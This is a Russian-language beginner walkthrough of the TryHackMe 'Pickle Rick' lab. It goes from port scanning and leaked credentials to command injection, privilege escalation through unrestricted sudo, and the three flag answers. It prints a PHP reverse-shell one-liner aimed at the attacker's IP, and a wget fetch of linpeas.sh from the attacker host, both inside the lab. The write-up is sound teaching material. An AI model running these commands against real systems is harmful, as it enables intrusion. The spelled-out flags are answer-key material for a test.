# THM Pickle Rick — разбор для новичка

Это коробка (машина) с TryHackMe. Цель простая: зайти на сайт, найти три «секретных ингредиента» (это и есть флаги) и сдать их как ответы на вопросы. IP ниже — адрес машины на момент прохождения; у тебя в лабе он будет другим, подставь свой.

По ходу дела мы пройдём обычную цепочку веб-пентеста:

1. Посмотреть, какие порты открыты.
2. Открыть сайт в браузере и посмотреть его исходный код.
3. Проверить стандартные файлы вроде `robots.txt`.
4. Попробовать очевидный вход (SSH) и понять, почему он не сработал.
5. Найти скрытую страницу входа.
6. Получить выполнение команд на сервере и превратить его в нормальную оболочку (shell).
7. Найти первый и второй ингредиенты от имени веб-пользователя.
8. Понять, что этот пользователь может запускать команды от root, и забрать третий ингредиент.

---

## 1. Разведка: какие порты открыты

Первым делом смотрим, что на машине вообще слушает сеть. Для этого подходит `nmap`.

- `-sV` — не просто «порт открыт», а ещё и пытается определить программу и её версию.
- `-sC` — прогнать стандартный набор скриптов nmap (они сами вытаскивают заголовок сайта, ключи SSH и т.п.).

```
nmap -sC -sV 10.113.172.154

Nmap scan report for 10.113.172.154

Not shown: 997 closed tcp ports (conn-refused)

| ssh-hostkey:
|   3072 fb:fa:95:46:b8:ab:6e:d5:f6:57:77:a3:dc:18:48:9a (RSA)
|   256 58:b9:b7:f8:29:8a:fe:50:50:89:4f:4d:7d:b0:6c:8d (ECDSA)
|_  256 b1:d5:6e:ee:7f:a6:c1:af:28:6a:8d:93:84:39:0b:d5 (ED25519)

```

Что из этого реально важно новичку:

| Порт | Что это | Стоит ли лезть сразу |
|---|---|---|
| 22/tcp | SSH — удалённый вход в консоль сервера | Позже, когда появится логин и пароль |
| 53/tcp | DNS-сервер Unbound | Нет. Имя `ams01` — это инфраструктура самой лаборатории TryHackMe, а не подсказка коробки |
| 80/tcp | Веб-сервер Apache, заголовок страницы «Rick is sup4r cool» | Да, это точка входа |

Закрытые порты (`997 closed`) означают, что на них никто не слушает и соединение сразу отвергается. Нас интересуют только три открытых, и начинать логично с сайта.

## 3. robots.txt — первая проверка на «спрятанное»

`robots.txt` — текстовый файл в корне сайта. Им владелец говорит поисковым роботам, какие страницы не индексировать. Для нас он полезен тем, что часто прямо перечисляет пути, которые автор не хотел светить. Проверяется он просто: дописываем `/robots.txt` к адресу сайта.

```
http://10.113.172.154/robots.txt
```

Внутри одна строка:

```
Wubbalubbadubdub
```

Это не путь к странице (обычно там бывает что-то вроде `Disallow: /admin`), а просто слово. Вместе с логином из исходника получается пара:

- логин: `R1ckRul3s`
- пароль-кандидат: `Wubbalubbadubdub`

## 4. SSH: пара есть, но войти нельзя

Раз на 22 порту открыт SSH, первая мысль — это учётка именно от него. Пробуем:

```
ssh R1ckRul3s@10.113.172.154
The authenticity of host '10.113.172.154 (10.113.172.154)' can't be established.
ED25519 key fingerprint is: SHA256:MAgba6lm74FMFD43Uy4PXc9qqYtXyznR4oSDF6/w+7w
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.113.172.154' (ED25519) to the list of known hosts.
R1ckRul3s@10.113.172.154: Permission denied (publickey).
```

Что здесь происходит по шагам:

1. При первом подключении SSH не знает сервер и показывает отпечаток его ключа. `yes` значит «да, я доверяю этому адресу, запомни его». Для учебной машины это нормально.
2. Предупреждение про post-quantum key exchange можно игнорировать: оно про будущие алгоритмы шифрования, к задаче отношения не имеет.
3. Главная строка — последняя: `Permission denied (publickey)`.

В скобках SSH пишет, **какие способы входа сервер вообще принимает**. Здесь это только `publickey` — вход по ключу. Входа по паролю на сервере нет, поэтому наш пароль ему даже не предложат ввести. Логин с паролем пригодится где-то ещё.

## 5. Поиск скрытых страниц (фаззинг каталогов)

Если страница входа не указана на главной, её ищут перебором типичных имён: `admin`, `login`, `portal` и так далее. Инструмент `dirb` берёт словарь слов и по очереди запрашивает `http://адрес/<слово>`.

```
dirb http://10.113.172.154/

START_TIME: Sun Oct  4 21:33:34 2026
URL_BASE: http://10.113.172.154/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
GENERATED WORDS: 4612

---- Scanning URL: http://10.113.172.154/ ----
==> DIRECTORY: http://10.113.172.154/assets/
+ http://10.113.172.154/index.html (CODE:200|SIZE:1062)
+ http://10.113.172.154/robots.txt (CODE:200|SIZE:17)
+ http://10.113.172.154/server-status (CODE:403|SIZE:279)

---- Entering directory: http://10.113.172.154/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
-----------------
END_TIME: Sun Oct  4 21:43:27 2026
DOWNLOADED: 4612 - FOUND: 3
```

Как читать ответ:

- `CODE:200` — страница существует и отдалась.
- `CODE:403` — страница есть, но сервер запретил её смотреть. `server-status` — служебная страница Apache, нам она не поможет.
- `DIRECTORY` и `LISTABLE` — каталог `assets/` можно открыть в браузере и увидеть список файлов. Там только картинка и стили, которые уже подключены на главной.

Новой страницы входа словарь не нашёл. Это не тупик: словари содержат частые имена, а имя страницы может быть необычным. Имеет смысл вернуться к тому, что уже известно, и попробовать очевидные адреса руками.

Пара `R1ckRul3s` / `Wubbalubbadubdub` выглядит как логин с паролем, значит где-то должна быть форма. Страница логина на PHP часто называется просто `login.php`. Открываем её напрямую:

```
http://10.113.172.154/login.php
```

![[Pasted image 20261004214607.png]]

Форма принимает найденные логин и пароль, и мы внутри.

## 6. Командная панель — это выполнение команд на сервере

После входа открывается страница, куда можно вписать команду, и она выполняется.

![[Pasted image 20261004214703.png]]

Это классическая веб-уязвимость: **command injection**, выполнение команд ОС через веб-страницу. Сервер берёт то, что ты ввёл, и передаёт это командному интерпретатору. Пользователь, от имени которого крутится сайт, — обычно `www-data`. Его права небольшие, но читать многие файлы на системе он может.

Такой «веб-шелл» неудобный: каждая команда — отдельный запрос, нет нормальной истории, стрелок и автодополнения, а некоторые команды (например те, что ждут ввода) через него вообще не запустить. Поэтому следующая цель — получить полноценную интерактивную оболочку к себе на машину. Это называется **reverse shell**: целевая машина сама подключается к тебе, а не наоборот.

### Слушатель на своей машине

Сначала на **своей** атакующей машине открываем порт и ждём входящее соединение. В отдельном терминале:

```bash
nc -lvnp 1337
```

- `-l` — слушать (быть сервером),
- `-v` — подробно писать, что происходит,
- `-n` — не резолвить имена, работать с голыми IP,
- `-p 1337` — на каком порту ждать.

Пока эта команда висит и пишет `listening`, порт открыт.

### Команда, которую отправляем в панель

В поле на сайте отправляем не «просто bash», а однострочник на PHP: на машине точно есть PHP, раз сайт на нём работает.

```bash
php -r '$sock=fsockopen("192.168.159.223",1337);exec("bash <&3 >&3 2>&3");'
```

Разбор по частям:

- `php -r '...'` — выполнить PHP-код прямо из аргумента, без файла.
- `fsockopen("192.168.159.223", 1337)` — открыть TCP-соединение на **твой** IP и на порт, где ждёт `nc`. `192.168.159.223` — адрес атакующей машины в сети лаборатории (его видно через `ip a` в туннеле). Это не IP цели.
- `exec("bash <&3 >&3 2>&3")` — запустить bash и привязать к открытому соединению три потока: ввод (`<&3`), обычный вывод (`>&3`) и вывод ошибок (`2>&3`). Дескриптор 3 — это как раз сокет, который только что открыл PHP.

Если всё верно, в терминале с `nc` появится приглашение оболочки. Мы на сервере, но оболочка «глупая».

### Нормальный терминал

Интерактивный bash умеет стрелки, `Ctrl+C`, очистку экрана. Чтобы его получить, обычно хватает Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

`pty` — псевдотерминал: программа начинает думать, что её запустили в настоящем окне терминала, а не через трубу. На этой машине Python не установлен, команда не сработает.

Замена, которая есть почти в любом Linux, — `script`. Она как раз пишет сессию терминала и для этого тоже поднимает псевдотерминал:

```bash
script -qc /bin/bash /dev/null
```

- `-q` — тихий режим, без сообщения «Script started»,
- `-c /bin/bash` — какую команду запустить внутри,
- `/dev/null` — куда писать лог сессии; нам лог не нужен, отправляем в никуда.

![[Pasted image 20261004215254.png]]

Теперь приглашение выглядит как обычный bash, и можно спокойно ходить по файловой системе.

Команды веб-панели выполняются из каталога сайта, `/var/www/html`. Смотрим, что в нём лежит, и читаем файл с очевидным именем:

## 8. Второй ингредиент

```
www-data@ip-10-113-172-154:/$ cd /home
www-data@ip-10-113-172-154:/home$ ls
rick  ubuntu
www-data@ip-10-113-172-154:/home$ cd rick
www-data@ip-10-113-172-154:/home/rick$ ls -lah
total 12K
drwxrwxrwx 2 root root 4.0K Feb 10  2019  .
drwxr-xr-x 4 root root 4.0K Feb 10  2019  ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 'second ingredients'
www-data@ip-10-113-172-154:/home/rick$ cat 'second ingredients'
1 jerry tear
```

На что смотреть новичку:

- В `/home` два пользователя: `rick` и `ubuntu`. `ubuntu` — стандартный пользователь образа, интереснее каталог `rick`.
- `ls -lah` показывает права. `drwxrwxrwx` на каталоге значит, что читать, писать и заходить в него может кто угодно, включая `www-data`. Так быть не должно, и именно поэтому веб-пользователь видит чужую домашку.
- В имени файла есть пробел (`second ingredients`), поэтому в `cat` его нужно взять в кавычки. Иначе оболочка решит, что это два аргумента: файл `second` и файл `ingredients`.

Содержимое — второй флаг:

```
1 jerry tear
```

## 9. Повышение привилегий: что можно запускать через sudo

Третий ингредиент почти наверняка лежит там, куда `www-data` не пускают, — например в `/root`. Значит, нужно стать root.

Вместо того чтобы вручную перебирать десятки проверок (SUID-файлы, cron, пароли в конфигах), на машину скачивают скрипт-сборщик. `linpeas.sh` сам проходит по системе и подсвечивает всё, что похоже на путь к повышению прав.

Файл сначала качают на атакующую машину (релиз с GitHub проекта PEASS-ng), кладут в какой-нибудь каталог и поднимают там простой веб-сервер:

```bash
python3 -m http.server 1333
```

Потом **с целевой машины** забирают его к себе. Качать нужно в каталог, куда `www-data` может писать, обычно это `/tmp`:

```
www-data@ip-10-113-191-231:/tmp$ wget http://192.168.159.223:1333/linpeas.sh
--2026-10-04 19:03:07--  http://192.168.159.223:1333/linpeas.sh
Length: 971926 (949K) [application/x-sh]
Saving to: 'linpeas.sh'
linpeas.sh          100%[===================>] 949.15K   256KB/s    in 3.8s
2026-10-04 19:03:11 (249 KB/s) - 'linpeas.sh' saved [971926/971926]
```

Адрес снова наш, атакующий: цель тянет файл с нас, а не из интернета. IP цели в этом выводе (`10.113.191.231`) отличается от того, что был в начале (`10.113.172.154`): машина в лабе переподнималась и получила новый адрес. На прохождение это не влияет.

Дальше:

```bash
chmod +x linpeas.sh
./linpeas.sh
```

Вывод длинный. В нём есть SUID-файл `pkexec` — это бывает полезно на старых системах (уязвимость PwnKit), но здесь есть находка проще и сильнее. Её, кстати, видно и без linpeas, одной командой:

```bash
sudo -l
```

`sudo -l` спрашивает: «какие команды мне разрешено запускать через sudo?» Ответ:

```
Matching Defaults entries for www-data on ip-10-113-191-231:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-113-191-231:
    (ALL) NOPASSWD: ALL
```

Читается это так:

- `(ALL)` — от имени любого пользователя, в том числе root;
- `NOPASSWD` — пароль при этом не спросят;
- `ALL` — разрешена любая команда.

То есть `www-data` может выполнить что угодно с правами root. Это ошибка конфигурации: веб-пользователь не должен иметь sudo вообще. Раз так настроено, root-оболочка берётся одной командой:

```bash
sudo bash
```

Приглашение меняется с `www-data@...$` на `root@...#` — решётка вместо доллара и есть признак, что мы root.

## 10. Третий ингредиент

Домашний каталог root — `/root`, туда же ведёт `cd ~`, когда ты уже root:

```
www-data@ip-10-113-191-231:/tmp$ sudo bash
root@ip-10-113-191-231:/tmp# cd ~
root@ip-10-113-191-231:~# ls
3rd.txt  snap
root@ip-10-113-191-231:~# cat 3rd.txt
3rd ingredients: fleeb juice
```

Третий флаг: `fleeb juice`.

## Что из этого стоит запомнить

- Исходный код страницы и `robots.txt` проверяют до любого сканера: тут оба сработали и дали логин с паролем.
- `Permission denied (publickey)` значит «сервер принимает только ключ», а не «пароль неверный». Пароль просто некуда вводить.
- Словарь фаззинга ничего не нашёл — это не повод останавливаться. Короткое очевидное имя (`login.php`) словарь мог не содержать, его быстрее проверить руками.
- Веб-шелл стоит сразу превращать в reverse shell: дальше работать в разы удобнее. Если нет Python, `script -qc /bin/bash /dev/null` делает то же самое.
- Перед поиском сложных уязвимостей для повышения прав всегда запускай `sudo -l`. Здесь он один закрывает вопрос.
